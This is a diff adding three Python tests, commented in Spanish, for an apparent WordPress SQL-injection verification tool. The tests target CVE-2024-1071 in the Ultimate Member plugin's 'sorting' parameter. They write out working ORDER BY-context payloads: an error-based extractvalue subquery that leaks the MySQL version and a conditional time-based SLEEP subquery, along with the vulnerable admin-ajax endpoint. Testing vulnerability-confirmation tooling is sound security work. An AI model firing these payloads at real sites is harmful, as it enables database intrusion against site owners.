@@ -10591,6 +10591,118 @@ def test_verify_wordpress_sqli_matches_real_published_exploit_scraping_and_id_br
     assert res.evidence.get("placeholders_resueltos", {}).get("dir_id") == REAL_DIR_ID
 
 
+def test_verify_wordpress_sqli_confirms_order_by_context_error_based(monkeypatch):
+    # bug real confirmado en vivo, CVE-2024-1071 (Ultimate Member, parametro 'sorting'): el
+    # sumidero real mete el valor DIRECTO en un ORDER BY (WP_User_Query 'orderby' sin whitelist
+    # -- sorting_query() hace literalmente $this->query_args['orderby'] = $sortby;), asi que
+    # ningun payload de contexto WHERE (comilla + AND/OR) puede confirmarlo nunca -- solo una
+    # subconsulta escalar COMPLETA (sin AND/OR ni comillas) como valor entero.
+    import binoracle.workflows.wpverify as wpverify
+
+    ORDER_BY_ERROR_PAYLOAD = "(SELECT extractvalue(1,concat(0x7e,version())))"
+
+    class _FakeSession:
+        def request(self, method, url, **kw):
+            payload = kw.get("data") or kw.get("params") or {}
+            val = payload.get("sorting", "")
+
+            class _R:
+                status_code = 200
+
+            r = _R()
+            if val == ORDER_BY_ERROR_PAYLOAD:
+                r.text = "XPATH syntax error: '~5.7.44-bino'"
+            else:
+                r.text = '{"success":true,"data":[]}'
+            return r
+
+    fake_boot = wpverify._LabSession(
+        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a", admin_pass="b",
+        sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None, shots=[],
+        capture=lambda *a, **k: None)
+    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
+    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
+
+    res = wpverify.verify_wordpress_sqli(
+        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=um_get_members", "POST",
+        {"sorting": "1"}, sqli_param_hint="sorting")
+
+    assert res.verified is True
+    assert res.evidence.get("tecnica") == "order-by-context-error-based"
+    assert res.evidence.get("mysql_version_extraida") == "5.7.44"
+    assert "contexto ORDER BY" in res.detail
+
+
+def test_verify_wordpress_sqli_confirms_order_by_context_conditional_time_based(monkeypatch):
+    # cuando ni error-based en contexto WHERE ni en contexto ORDER BY filtran nada, el ultimo
+    # recurso es time-based CONDICIONAL (CASE WHEN) en contexto ORDER BY -- debe confirmar solo
+    # cuando una CONDICION real controla el retraso (1=1 retrasa, 1=2 no), no con un SLEEP
+    # incondicional que se aceptaria igual sin que haya inyeccion real alguna.
+    import binoracle.workflows.wpverify as wpverify
+
+    clock = {"t": 0.0}
+    monkeypatch.setattr(wpverify.time, "time", lambda: clock["t"])
+
+    SLOW_PAYLOAD = "(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)"
+
+    class _FakeSession:
+        def request(self, method, url, **kw):
+            payload = kw.get("data") or kw.get("params") or {}
+            val = payload.get("sorting", "")
+            clock["t"] += 5.0 if val == SLOW_PAYLOAD else 0.01
+
+            class _R:
+                status_code = 200
+                text = '{"success":true,"data":[]}'
+            return _R()
+
+    fake_boot = wpverify._LabSession(
+        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a", admin_pass="b",
+        sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None, shots=[],
+        capture=lambda *a, **k: None)
+    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
+    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
+
+    res = wpverify.verify_wordpress_sqli(
+        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=um_get_members", "POST",
+        {"sorting": "1"}, sqli_param_hint="sorting")
+
+    assert res.verified is True
+    assert res.evidence.get("tecnica") == "order-by-context-time-based"
+    assert "contexto ORDER BY" in res.detail
+
+
+def test_verify_wordpress_sqli_order_by_context_negative_when_nothing_confirms(monkeypatch):
+    # negativo honesto: si ni el contexto WHERE ni el contexto ORDER BY (error-based o
+    # time-based condicional) muestran ninguna senal, no debe marcarse verificado -- y el
+    # detalle final debe mencionar que tambien se probo el contexto ORDER BY, no solo WHERE.
+    import binoracle.workflows.wpverify as wpverify
+
+    class _FakeSession:
+        def request(self, method, url, **kw):
+            class _R:
+                status_code = 200
+                text = '{"success":true,"data":[]}'
+            return _R()
+
+    fake_boot = wpverify._LabSession(
+        lab=None, base_url="http://lab.invalid", admin_id="1", admin_user="a", admin_pass="b",
+        sub_user="s", sub_pass="p", sub_sess=_FakeSession(), admin_sess=None, shots=[],
+        capture=lambda *a, **k: None)
+    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
+    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
+
+    res = wpverify.verify_wordpress_sqli(
+        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=um_get_members", "POST",
+        {"sorting": "1"}, sqli_param_hint="sorting")
+
+    assert res.verified is False
+    assert "la inyeccion SQL no se confirmo" in res.detail
+    assert "contexto ORDER BY" in res.detail
+    assert "orderby_error_intentos" in res.evidence
+    assert "orderby_timing_intentos" in res.evidence
+
+
 def test_verify_wordpress_sqli_attacks_shortcode_page_instead_of_bare_root(monkeypatch):
     # bug real confirmado en vivo, CVE-2024-3552: atacar '/' no puede mostrar ninguna diferencia
     # visible aunque la inyeccion sea real, porque esa pagina no invoca nada del plugin. Cuando
